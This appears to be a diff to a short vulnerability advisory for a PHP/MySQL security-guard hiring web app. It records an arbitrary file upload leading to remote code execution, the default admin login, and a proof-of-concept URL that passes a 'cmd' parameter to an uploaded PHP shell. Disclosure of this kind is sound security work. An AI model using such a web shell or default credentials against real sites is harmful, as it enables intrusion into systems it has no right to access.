@@ -1,10 +1,12 @@
 # Online Security Guard Hiring System
 + version 1.0
 + vendors : [Online Security Guards Hiring System using PHP and MySQL](https://phpgurukul.com/online-security-guards-hiring-system-using-php-and-mysql/)
++ Software Link: https://phpgurukul.com/projects/Online-Security-Guard-Hiring-System_PHP.zip
 + Tested on: Windows 10 + XAMPP
 + Credential for admin panel :
   + Username: admin
   + Password: Test@123
++ arbitrary file upload (RCE)
 
 **Affect URL**
 > http://localhost/osghs/admin/images/index.php?cmd=phpinfo();
